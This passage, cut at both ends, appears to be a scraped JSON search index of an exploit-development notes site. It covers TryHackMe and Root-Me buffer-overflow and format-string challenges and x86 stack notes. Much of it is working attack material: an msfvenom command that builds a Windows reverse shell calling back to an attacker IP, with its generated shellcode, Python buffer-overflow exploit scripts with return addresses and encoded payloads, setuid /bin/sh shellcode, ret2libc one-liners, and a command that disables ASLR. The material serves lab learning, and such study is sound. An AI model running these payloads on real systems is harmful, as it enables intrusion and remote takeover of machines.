report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 149.29 seconds Raw packets sent: 10 (424B) | Rcvd: 2 (72B) Interacting with the service on port 31337  nc $MACHINE_IP 31337 Hello !!! Hi Hello Hi!!! And with a very long string, gets kicked out. SMB  Using smbclient to list available shares on the host: smbclient -L $MACHINE_IP Enter WORKGROUP\\root's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Users Disk SMB1 disabled -- no workgroup available Using smbclient to access the Users share anonymously: smbclient \\\\\\\\$MACHINE_IP\\\\Users Enter WORKGROUP\\root's password: Try \"help\" to get a list of possible commands. smb: \\> ls . DR 0 Thu May 14 21:57:08 2020 .. DR 0 Thu May 14 21:57:08 2020 Default DHR 0 Tue Jul 14 03:07:31 2009 desktop.ini AHS 174 Tue Jul 14 00:54:24 2009 Share D 0 Thu May 14 21:58:07 2020 7863807 blocks of size 4096. 3876715 blocks available smb: \\> cd Share smb: \\Share\\> ls . D 0 Thu May 14 21:58:07 2020 .. D 0 Thu May 14 21:58:07 2020 gatekeeper.exe A 13312 Mon Apr 20 01:27:17 2020 7863807 blocks of size 4096. 3876715 blocks available Getting the gatekeeper.exe file: smb: \\Share\\> get gatekeeper.exe getting file \\Share\\gatekeeper.exe of size 13312 as gatekeeper.exe (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec) Start a web server on the Kali VM in the directory with the files (to download the files to the Windows VM): python3 -m http.server Exploiting buffer overflow  Get the binary file from the Kali box and follow the stack-based buffer overflow howto for creating BoF scripts, with: Offset: 146 JMP ESP address: 080414C3 Bad characters: 00, 0a Generate payload with msfvenom ( tun0 IP address of KALI on the THM network): # msfvenom -p windows/shell_reverse_tcp LHOST=10.18.22.77 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b \"\\x00\\x0a\" [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of c file: 1506 bytes unsigned char buf[] = \"\\xda\\xcf\\xd9\\x74\\x24\\xf4\\xb8\\x4e\\x9a\\xa4\\x81\\x5a\\x33\\xc9\" \"\\xb1\\x52\\x83\\xc2\\x04\\x31\\x42\\x13\\x03\\x0c\\x89\\x46\\x74\\x6c\" \"\\x45\\x04\\x77\\x8c\\x96\\x69\\xf1\\x69\\xa7\\xa9\\x65\\xfa\\x98\\x19\" \"\\xed\\xae\\x14\\xd1\\xa3\\x5a\\xae\\x97\\x6b\\x6d\\x07\\x1d\\x4a\\x40\" \"\\x98\\x0e\\xae\\xc3\\x1a\\x4d\\xe3\\x23\\x22\\x9e\\xf6\\x22\\x63\\xc3\" \"\\xfb\\x76\\x3c\\x8f\\xae\\x66\\x49\\xc5\\x72\\x0d\\x01\\xcb\\xf2\\xf2\" \"\\xd2\\xea\\xd3\\xa5\\x69\\xb5\\xf3\\x44\\xbd\\xcd\\xbd\\x5e\\xa2\\xe8\" \"\\x74\\xd5\\x10\\x86\\x86\\x3f\\x69\\x67\\x24\\x7e\\x45\\x9a\\x34\\x47\" \"\\x62\\x45\\x43\\xb1\\x90\\xf8\\x54\\x06\\xea\\x26\\xd0\\x9c\\x4c\\xac\" \"\\x42\\x78\\x6c\\x61\\x14\\x0b\\x62\\xce\\x52\\x53\\x67\\xd1\\xb7\\xe8\" \"\\x93\\x5a\\x36\\x3e\\x12\\x18\\x1d\\x9a\\x7e\\xfa\\x3c\\xbb\\xda\\xad\" \"\\x41\\xdb\\x84\\x12\\xe4\\x90\\x29\\x46\\x95\\xfb\\x25\\xab\\x94\\x03\" \"\\xb6\\xa3\\xaf\\x70\\x84\\x6c\\x04\\x1e\\xa4\\xe5\\x82\\xd9\\xcb\\xdf\" \"\\x73\\x75\\x32\\xe0\\x83\\x5c\\xf1\\xb4\\xd3\\xf6\\xd0\\xb4\\xbf\\x06\" \"\\xdc\\x60\\x6f\\x56\\x72\\xdb\\xd0\\x06\\x32\\x8b\\xb8\\x4c\\xbd\\xf4\" \"\\xd9\\x6f\\x17\\x9d\\x70\\x8a\\xf0\\xa8\\x96\\x82\\x4d\\xc5\\x94\\xaa\" \"\\x5c\\x49\\x10\\x4c\\x34\\x61\\x74\\xc7\\xa1\\x18\\xdd\\x93\\x50\\xe4\" \"\\xcb\\xde\\x53\\x6e\\xf8\\x1f\\x1d\\x87\\x75\\x33\\xca\\x67\\xc0\\x69\" \"\\x5d\\x77\\xfe\\x05\\x01\\xea\\x65\\xd5\\x4c\\x17\\x32\\x82\\x19\\xe9\" \"\\x4b\\x46\\xb4\\x50\\xe2\\x74\\x45\\x04\\xcd\\x3c\\x92\\xf5\\xd0\\xbd\" \"\\x57\\x41\\xf7\\xad\\xa1\\x4a\\xb3\\x99\\x7d\\x1d\\x6d\\x77\\x38\\xf7\" \"\\xdf\\x21\\x92\\xa4\\x89\\xa5\\x63\\x87\\x09\\xb3\\x6b\\xc2\\xff\\x5b\" \"\\xdd\\xbb\\xb9\\x64\\xd2\\x2b\\x4e\\x1d\\x0e\\xcc\\xb1\\xf4\\x8a\\xec\" \"\\x53\\xdc\\xe6\\x84\\xcd\\xb5\\x4a\\xc9\\xed\\x60\\x88\\xf4\\x6d\\x80\" \"\\x71\\x03\\x6d\\xe1\\x74\\x4f\\x29\\x1a\\x05\\xc0\\xdc\\x1c\\xba\\xe1\" \"\\xf4\"; Putting payload in script: import socket ip = \"10.10.56.225\" port = 31337 offset = 146 overflow = \"A\" * offset retn = \" \\xC3\\x14\\x04\\x08 \" # JMP ESP address 080414C3 padding = \" \\x90 \" * 16 postfix = \"\" payload = ( \" \\xda\\xcf\\xd9\\x74\\x24\\xf4\\xb8\\x4e\\x9a\\xa4\\x81\\x5a\\x33\\xc9 \" \" \\xb1\\x52\\x83\\xc2\\x04\\x31\\x42\\x13\\x03\\x0c\\x89\\x46\\x74\\x6c \" \" \\x45\\x04\\x77\\x8c\\x96\\x69\\xf1\\x69\\xa7\\xa9\\x65\\xfa\\x98\\x19 \" \" \\xed\\xae\\x14\\xd1\\xa3\\x5a\\xae\\x97\\x6b\\x6d\\x07\\x1d\\x4a\\x40 \" \" \\x98\\x0e\\xae\\xc3\\x1a\\x4d\\xe3\\x23\\x22\\x9e\\xf6\\x22\\x63\\xc3 \" \" \\xfb\\x76\\x3c\\x8f\\xae\\x66\\x49\\xc5\\x72\\x0d\\x01\\xcb\\xf2\\xf2 \" \" \\xd2\\xea\\xd3\\xa5\\x69\\xb5\\xf3\\x44\\xbd\\xcd\\xbd\\x5e\\xa2\\xe8 \" \" \\x74\\xd5\\x10\\x86\\x86\\x3f\\x69\\x67\\x24\\x7e\\x45\\x9a\\x34\\x47 \" \" \\x62\\x45\\x43\\xb1\\x90\\xf8\\x54\\x06\\xea\\x26\\xd0\\x9c\\x4c\\xac \" \" \\x42\\x78\\x6c\\x61\\x14\\x0b\\x62\\xce\\x52\\x53\\x67\\xd1\\xb7\\xe8 \" \" \\x93\\x5a\\x36\\x3e\\x12\\x18\\x1d\\x9a\\x7e\\xfa\\x3c\\xbb\\xda\\xad \" \" \\x41\\xdb\\x84\\x12\\xe4\\x90\\x29\\x46\\x95\\xfb\\x25\\xab\\x94\\x03 \" \"...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "f91a38435980c20a5343f56707f3da97",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-string-basic1",
    "t": "ELF x86: Format string bug basic 1 ",
    "c": "ELF x86: Format string bug basic 1  root-me challenge : … or how to read through the stack. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <unistd.h> int main(int argc, char *argv[]){ FILE *secret = fopen(\"/challenge/app-systeme/ch5/.passwd\", \"rt\"); char buffer[32]; fgets(buffer, sizeof(buffer), secret); printf(argv[1]); fclose(secret); return 0; } Resources  Chaine de format - lecture en mémoire Format Bugs - Exploiting format string",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "104031dc5d5cce4a6ebb48824eb43204",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-string-basic2",
    "t": "ELF x86: Format string bug basic 2 ",
    "c": "ELF x86: Format string bug basic 2  root-me challenge : Or how to write what you want where you want in the stack. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack YES ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> int main( int argc, char ** argv ) { int var; int check = 0x04030201; char fmt[128]; if (argc <2) exit(0); memset( fmt, 0, sizeof(fmt) ); printf( \"check at 0x%x\\n\", &check ); printf( \"argv[1] = [%s]\\n\", argv[1] ); snprintf( fmt, sizeof(fmt), argv[1] ); if ((check != 0x04030201) && (check != 0xdeadbeef)) printf (\"\\nYou are on the right way !\\n\"); printf( \"fmt=[%s]\\n\", fmt ); printf( \"check=0x%x\\n\", check ); if (check==0xdeadbeef) { printf(\"Yeah dude ! You win !\\n\"); setreuid(geteuid(), geteuid()); system(\"/bin/bash\"); } } Resources  Chaine de format - écriture en mémoire PHRACK - Advances in format string exploitation DEFCON 18 Advanced Format String Attacks Format String and Double-Free Attacks Les failles Format String",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cb5be644a70f1371cf715d10a36824ed",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic2",
    "t": "ELF x86: Stack buffer overflow basic 2 ",
    "c": "ELF x86: Stack buffer overflow basic 2  RootMe challenge: ELF x86 - Stack buffer overflow basic 2 : An intermediate level to familiarize yourself with stack overflows. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack Yes ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <unistd.h> void shell() { setreuid(geteuid(), geteuid()); system(\"/bin/bash\"); } void sup() { printf(\"Hey dude ! Waaaaazzaaaaaaaa ?!\\n\"); } void main() { int var; void (*func)()=sup; char buf[128]; fgets(buf,133,stdin); func(); } app-systeme-ch15@challenge02:~$ gdb ch15 GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1 ... Reading symbols from ch15...(no debugging symbols found)...done. (gdb) info functions All defined functions: Non-debugging symbols: 0x08048350 _init 0x08048390 fgets@plt 0x080483a0 geteuid@plt 0x080483b0 puts@plt 0x080483c0 system@plt 0x080483d0 setreuid@plt 0x080483e0 __libc_start_main@plt 0x080483f0 __gmon_start__@plt 0x08048400 _start 0x08048440 _dl_relocate_static_pie 0x08048450 __x86.get_pc_thunk.bx 0x08048460 deregister_tm_clones 0x080484a0 register_tm_clones 0x080484e0 __do_global_dtors_aux 0x08048510 frame_dummy 0x08048516 shell 0x08048559 sup 0x08048584 main 0x080485de __x86.get_pc_thunk.ax 0x080485f0 __libc_csu_init ---Type <return> to continue, or q <return> to quit---q Quit app-systeme-ch15@challenge02:~$ cat <(python -c \"print 'A'*128 + '\\x64\\x84\\x04\\x08'\") - | ./ch15 cat .passwd Resources  Débordement de tampon - dans la pile François Boisson : Buffer Overflow ou explication de «une faille de type bufferoverflow … (YouTube) Stack Bug - Exploitation avancee de buffer overflow Exploiting Stack Buffer Overflows in the Linux x86 Kernel 64 Bits Linux Stack Based Buffer Overflow",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c561bcae1ffb29e9195f7e5dd39e9405",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic5",
    "t": "ELF x86: Stack buffer overflow basic 5 ",
    "c": "ELF x86: Stack buffer overflow basic 5  root-me challenge : Please don’t smash me! Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <string.h> #include <stdlib.h> #include <ctype.h> #include <unistd.h> #include <sys/types.h> #define BUFFER 512 struct Init { char username[128]; uid_t uid; pid_t pid; }; void cpstr(char *dst, const char *src) { for(; *src; src++, dst++) { *dst = *src; } *dst = 0; } void chomp(char *buff) { for(; *buff; buff++) { if(*buff == '\\n' || *buff == '\\r' || *buff == '\\t') { *buff = 0; break; } } } struct Init Init(char *filename) { FILE *file; struct Init init; char buff[BUFFER+1]; if((file = fopen(filename, \"r\")) == NULL) { perror(\"[-] fopen \"); exit(0); } memset(&init, 0, sizeof(struct Init)); init.pid = getpid(); init.uid = getuid(); while(fgets(buff, BUFFER, file) != NULL) { chomp(buff); if(strncmp(buff, \"USERNAME=\", 9) == 0) { cpstr(init.username, buff+9); } } fclose(file); return init; } int main(int argc, char **argv) { struct Init init; if(argc != 2) { printf(\"Usage : %s <config_file>\\n\", argv[0]); exit(0); } init = Init(argv[1]); printf(\"[+] Runing the program with username %s, uid %d and pid %d.\\n\", init.username, init.uid, init.pid); return 0; } Resources  Phrack 67 - Scraps of notes on remote stack overflow exploitation - pi3 Stack Bug - Stack Overflow ASLR bypass using ret2reg Stack Bug - Exploitation avancee de buffer overflow Stack Bug - Stack Overflow Exploiting Stack Buffer Overflows in the Linux x86 Kernel",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e90d797c753938e34d233ae08b88065e",
    "u": "https://bof.tymyrddin.dev/docs/notes/patterns",
    "t": "Stack operations and function-calling ",
    "c": "Stack operations and function-calling  Function call : When a function is called in assembly code, the calling program sets up the function call by first placing the function parameters on the stack in reverse order, the Extended Instruction Pointer (EIP) is saved on the stack so the program can continue where it left off when the function returns (return address), the call command is executed, and the address of the function is placed in the EIP to execute: 0x5655621b <+38>: mov edx,DWORD PTR [eax] 0x5655621d <+40>: mov eax,DWORD PTR [ebx+0x4] 0x56556220 <+43>: add eax,0x4 0x56556223 <+46>: mov eax,DWORD PTR [eax] 0x56556225 <+48>: sub esp,0x8 0x56556228 <+51>: push edx 0x56556229 <+52>: push eac 0x5655622a <+53>: call 0x565561a9 <greeting> Function prolog : The called function’s responsibilities are to save the calling program’s EBP register on the stack, save the current ESP register to the EBP register (setting the current stack frame), and then to decrement the ESP register to make room for the function’s local variables: 0x000011a9 <+0>: push ebp 0x000011aa <+1>: mov ebp,esp 0x000011ac <+3>: push ebx 0x000011ad <+4>: sub esp,0x194 Function epilog : The last thing a called function does before returning to the calling program is to clean up the stack by incrementing ESP to EBP, clearing the stack as part of the leave statement. Then the saved EIP is popped off the stack as part of the return process: 0x000011f3 <+74>: leave 0x000011f4 <+75>: ret",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1e6e1dfa8347af808076892f8b7a1b79",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic1",
    "t": "ELF x86: Stack buffer overflow basic 1 ",
    "c": "ELF x86: Stack buffer overflow basic 1  RootMe challenge: ELF x86 - Stack buffer overflow basic 1 : An intermediate level to familiarize yourself with stack overflows. Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack No ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Given code: #include <unistd.h> #include <sys/types.h> #include <stdlib.h> #include <stdio.h> int main() { int var; int check = 0x04030201; char buf[40]; fgets(buf,45,stdin); printf(\"\\n[buf]: %s\\n\", buf); printf(\"[check] %p\\n\", check); if ((check != 0x04030201) && (check != 0xdeadbeef)) printf (\"\\nYou are on the right way!\\n\"); if (check == 0xdeadbeef) { printf(\"Yeah dude! You win!\\nOpening your shell...\\n\"); setreuid(geteuid(), geteuid()); system(\"/bin/bash\"); printf(\"Shell closed! Bye.\\n\"); } return 0; } Apparently, the goal is to change the check variable to 0xdeadbeef (Endian). app-systeme-ch13@challenge02:~$ python -c \"print 'A'*40 + 'DDDD'\" | ./ch13 [buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD [check] 0x44444444 You are on the right way! app-systeme-ch13@challenge02:~$ cat <(python -c \"print 'A'*40 + '\\xef\\xbe\\xad\\xde'\") - | ./ch13 [buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ� [check] 0xdeadbeef Yeah dude! You win! Opening your shell... cat .passwd Resources  Débordement de tampon - dans la pile François Boisson : Buffer Overflow ou explication de “une faille de type bufferoverflow” Buffering in standard streams Stack Bug - Exploitation avancee de buffer overflow Exploiting Stack Buffer Overflows in the Linux x86 Kernel",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ee31826b775ab691387a733854ac551c",
    "u": "https://bof.tymyrddin.dev/docs/notes/linux-x86",
    "t": "Linux x86 exploits ",
    "c": "Linux x86 exploits  Buffer overflows can happen when an application uses an unbounded copy operation (such as strcpy in C) to copy a variable-size buffer into a fixed-size buffer without verifying that the fixed-sized buffer is large enough. overflow.c  // overflow.c #include <string.h> int main(){ char str1[10]; //declare a 10 byte string //copy 35 bytes of \"A\" to str1 strcpy (str1, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"); return 0; } Compile using -m32 and -fno-stack-protector to disable Stack Canary protection: $ gcc -m32 -fno-stack-protector -o overflow overflow.c $ ./overflow zsh: segmentation fault ./overflow Segmentation fault. Start up gdb : $ gdb -q overflow (gdb) r Starting program: overflow Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () The program crashes when trying to execute the instruction at 0x41414141 (hex for AAAA ). Check whether the EIP was corrupted with A ’s: (gdb) info reg eip eip 0x41414141 0x41414141 When the function ( main in this case) attempts to return, the saved EIP value is popped off the stack and executed next. Because the address 0x41414141 is out of the process segment, a segmentation fault occurs. meet.c  // meet.c #include <stdio.h> #include <string.h> void greeting(char *temp1,char *temp2) { char name[400]; // string variable to hold the name strcpy(name, temp2); // copy the function argument to name printf(\"Hello %s %s\\n\", temp1, name); // print out the greeting } int main(int argc, char * argv[]) { greeting(argv[1], argv[2]); //call function, pass title & name printf(\"Bye %s %s\\n\", argv[1], argv[2]); // say \"bye\" return 0; //exit program } Compile and execute: $ gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector \\ -z execstack -o meet meet.c $ ./meet Mr `python -c 'print(\"A\"*10)'` Hello Mr AAAAAAAAAA Bye Mr AAAAAAAAAA Feed 600 A ’s to the meet.c program as the second parameter: $ ./meet Mr `python -c 'print(\"A\"*600)'` zsh: segmentation fault (core dumped) ./meet Mr `python -c 'print(\"A\"*600)'` The 400-byte buffer has overflowed; To verify that so has the EIP, start gdb again: $ gdb -q ./meet Reading symbols from ./meet... (gdb) run Mr `python -c 'print(\"A\"*600)'` Starting program: meet Mr `python -c 'print(\"A\"*600)'` Program received signal SIGSEGV, Segmentation fault. 0xf7e6e37f in ?? () from /lib32/libc.so.6 Check EIP register: (gdb) info reg eip eip 0xf7e6e37f 0xf7e6e37f Mved far, far away to another portion of memory. Get the source listing: (gdb) list ```text 1 // meet.c 2 #include <stdio.h> 3 #include <string.h> 4 void greeting(char *temp1,char *temp2) { 5 char name[400]; // string variable to hold the name 6 strcpy(name, temp2); // copy the function argument to name 7 printf(\"Hello %s %s\\n\", temp1, name); // print out the greeting 8 } 9 int main(int argc, char * argv[]) { 10 greeting(argv[1], argv[2]); //call function, pass title & name Set breakpoint at line 7: (gdb) b 7 Breakpoint 1 at 0x11d0: file meet.c, line 7. Run: (gdb) run Mr `python -c 'print(\"A\"*600)'` Starting program: /home/kali/GHHv6/ch10/meet Mr `python -c 'print(\"A\"*600)'` Breakpoint 1, greeting (temp1=0x41414141 <error: Cannot access memory at address 0x41414141>, temp2=0x41414141 <error: Cannot access memory at address 0x41414141 at meet.c:7 7 printf(\"Hello %s %s\\n\", temp1, name); // print out the greeting The arguments to the function, temp1 and temp2 , have been corrupted. Pick a lower number of A ’s, for example 405 , and then slowly increase it. Remove breakpoint: (gdb) d 1 (gdb) run Mr `python -c 'print(\"A\"*405)'` (gdb) info reg ebp eip Summary  What can happen: It is really easy to get a segmentation fault when dealing with process memory. The EIP can be controlled to execute malicious code at the user level of access. This happens when the vulnerable program is running at the user level of privilege. The EIP can be controlled to execute malicious code at the system or root level. Some Linux functionalities should be protected and reserved for the root user. It is common practice to use Set-user Identification (SUID) and Set-group identification (SGID) to temporarily elevate a process to allow some files to be executed under their owner’s and/or group’s privilege level. But when the SUID/SGID program is vulnerable, a successful exploitation would drop the privileges of the file owner or group (root). Local buffer overflow exploits  #include <stdio.h> #include <sys/mman.h> const char shellcode[] = //setuid(0) & Aleph1's famous shellcode, see ref. \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\" //setuid(0) first \"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\" \"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\" \"\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\"; int main() { //main function //The shellcode is on the .data segment, //we will use mprotect to make the page executable. mprotect( (void *)((int)shellcode & ~4095), 4096, PROT_READ | PROT_WRITE | PROT_EXEC ); //Convert the address of the shellcode variable to a function pointer, //allowing us to call it and execute the code. int (*ret)() = (int(*)())shellcode; return ret(); } ASLR  Address space layout randomization (ASLR) works by randomizing the locations of different sections of the program in memory, including the executable base, stack, heap, and libraries, making it difficult for an attacker to reliably jump to a specific memory address. To disable ASLR : $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space NOP sled  The NOP (no operation) command simply means to do nothing but move to the next command. Hackers have learned to use NOP for padding. When placed at the front of an exploit buffer, this padding is called a NOP sled. If the EIP is pointed to a NOP sled, the processor will ride the sled right into the next component. On x86 systems, the 0x90 opcode is the most commonly used NOP. Any operation sequence that does not interfere with the exploit’s outcome would be considered equivalent to a NOP. Shellcode  Shellcode is a string of binary opcodes for the exploited architecture (Intel x86 32 bit, Intel x86 64 bit, etc), often represented in hexadecimal form. There are tons of shellcode libraries online, for all platforms. Using printf and wc to calculate size of a shellcode: $ printf \"\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh\" | wc -c 53 Find address  To find where to point EIP in order to execute the shellcode: $ gdb -q --args ./meet Mr `python -c 'print(\"A\"*412)'` (gdb) run Starting program: /path/to/meet Mr AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ... Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? () To look at what is on the stack, use the gdb examine memory command (for example in batches of 32 words (4 bytes) at a time): (gdb) x/32z $esp-200 Pick an address from the middle of the NOP sled to overwrite EIP. Final exploit code: For meet.c , 412 bytes - 53 bytes of shellcode - 4 bytes return address (reversed due to the little-endian style of x86 processors) = 355 bytes $ ./meet Mr `python -c \"print('\\x90'*355 + '\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh' + '\\x24\\xd2\\xff\\xff')\" Exploit development process  In the real world, vulnerabilities are not always as straightforward as the meet.c example. The stack overflow exploit development process generally follows these steps: Control the execution flow (EIP register) by identifying a vulnerability that results in an overflow of a return address. Determine the offset(s) and constrains (bad characters breaking the exploit such as line feeds, carriage returns, and null bytes). Determine the attack vector. Debug and trace the program’s flow during the overflow. Build the exploit. Test the exploit.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c5838ebe9f85d5de72ec8dfe8adb4e2b",
    "u": "https://bof.tymyrddin.dev/docs/root-me/elf-86-stack-basic6",
    "t": "ELF x86: Stack buffer overflow basic 6 ",
    "c": "ELF x86: Stack buffer overflow basic 6  root-me challenge : Environment configuration: PIE Position Independent Executable No RelRO Read Only relocations No NX Non-Executable Stack Yes ASLR Address Space Layout Randomization No SF Source Fortification No SSP Stack-Smashing Protection No SRC Source code access Yes Source code: #include <stdio.h> #include <string.h> #include <sys/types.h> #include <unistd.h> int main (int argc, char ** argv){ char message[20]; if (argc != 2){ printf (\"Usage: %s <message>\\n\", argv[0]); return -1; } setreuid(geteuid(), geteuid()); strcpy (message, argv[1]); printf (\"Your message: %s\\n\", message); return 0; } app-systeme-ch33@challenge02:~$ ./ch33 `python -c \"print 'A'*32 + '\\x10\\x33\\xe6\\xb7' + 'DDDD' + '\\x4c\\x5d\\xf8\\xb7'\"` Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�3��DDDDL]�� $ cat .passwd Resources  François Boisson : Buffer Overflow ou explication de “une faille de type bufferoverflow” Linux exploit development part 3 - ret2libc",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "77fca9f0f6e0af4d7b50c90c7fcb31bc",
    "u": "https://bof.tymyrddin.dev/docs/thm/overflow10",
    "t": "Example payload scripts ",
    "c": "Example payload scripts  Badchars: \\x00\\xa0\\xad\\xbe\\xde\\xef Exploit code  #!/usr/bin/env python3 import socket ip = \"MACHINE_IP\" port = 1337 buf_length = 1000 prefix = \"OVERFLOW10 \" offset = 537 # EIP offset overflow = \"A\" * offset jmp_esp = \" \\x05\\x12\\x50\\x62 \" buffer = \"\" buffer += prefix buffer += overflow # Padding buffer += jmp_esp # Overwrite saved return pointer buffer += \" \\x83\\xec\\x10 \" # NOP sled buffer += ( \" \\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e \" \" \\x11\\xab\\x0e\\x07\\x83\\xee\\xfc\\xe2\\xf4\\xed\\x43\\x8c\\x07\\x11\\xab \" \" \\x6e\\x8e\\xf4\\x9a\\xce\\x63\\x9a\\xfb\\x3e\\x8c\\x43\\xa7\\x85\\x55\\x05 \" \" \\x20\\x7c\\x2f\\x1e\\x1c\\x44\\x21\\x20\\x54\\xa2\\x3b\\x70\\xd7\\x0c\\x2b \" \" \\x31\\x6a\\xc1\\x0a\\x10\\x6c\\xec\\xf5\\x43\\xfc\\x85\\x55\\x01\\x20\\x44 \" \" \\x3b\\x9a\\xe7\\x1f\\x7f\\xf2\\xe3\\x0f\\xd6\\x40\\x20\\x57\\x27\\x10\\x78 \" \" \\x85\\x4e\\x09\\x48\\x34\\x4e\\x9a\\x9f\\x85\\x06\\xc7\\x9a\\xf1\\xab\\xd0 \" \" \\x64\\x03\\x06\\xd6\\x93\\xee\\x72\\xe7\\xa8\\x73\\xff\\x2a\\xd6\\x2a\\x72 \" \" \\xf5\\xf3\\x85\\x5f\\x35\\xaa\\xdd\\x61\\x9a\\xa7\\x45\\x8c\\x49\\xb7\\x0f \" \" \\xd4\\x9a\\xaf\\x85\\x06\\xc1\\x22\\x4a\\x23\\x35\\xf0\\x55\\x66\\x48\\xf1 \" \" \\x5f\\xf8\\xf1\\xf4\\x51\\x5d\\x9a\\xb9\\xe5\\x8a\\x4c\\xc3\\x3d\\x35\\x11 \" \" \\xab\\x66\\x70\\x62\\x99\\x51\\x53\\x79\\xe7\\x79\\x21\\x16\\x54\\xdb\\xbf \" \" \\x81\\xaa\\x0e\\x07\\x38\\x6f\\x5a\\x57\\x79\\x82\\x8e\\x6c\\x11\\x54\\xdb \" \" \\x57\\x41\\xfb\\x5e\\x47\\x41\\xeb\\x5e\\x6f\\xfb\\xa4\\xd1\\xe7\\xee\\x7e \" \" \\x99\\x6d\\x14\\xc3\\xce\\xaf\\x61\\x2b\\x66\\x05\\x11\\xaa\\xb5\\x8e\\xf7 \" \" \\xc1\\x1e\\x51\\x46\\xc3\\x97\\xa2\\x65\\xca\\xf1\\xd2\\x94\\x6b\\x7a\\x0b \" \" \\xee\\xe5\\x06\\x72\\xfd\\xc3\\xfe\\xb2\\xb3\\xfd\\xf1\\xd2\\x79\\xc8\\x63 \" \" \\x63\\x11\\x22\\xed\\x50\\x46\\xfc\\x3f\\xf1\\x7b\\xb9\\x57\\x51\\xf3\\x56 \" \" \\x68\\xc0\\x55\\x8f\\x32\\x06\\x10\\x26\\x4a\\x23\\x01\\x6d\\x0e\\x43\\x45 \" \" \\xfb\\x58\\x51\\x47\\xed\\x58\\x49\\x47\\xfd\\x5d\\x51\\x79\\xd2\\xc2\\x38 \" \" \\x97\\x54\\xdb\\x8e\\xf1\\xe5\\x58\\x41\\xee\\x9b\\x66\\x0f\\x96\\xb6\\x6e \" \" \\xf8\\xc4\\x10\\xee\\x1a\\x3b\\xa1\\x66\\xa1\\x84\\x16\\x93\\xf8\\xc4\\x97 \" \" \\x08\\x7b\\x1b\\x2b\\xf5\\xe7\\x64\\xae\\xb5\\x40\\x02\\xd9\\x61\\x6d\\x11 \" \" \\xf8\\xf1\\xd2 \" ) buffer += \"D\" * ( buf_length - ( len ( buffer ) - len 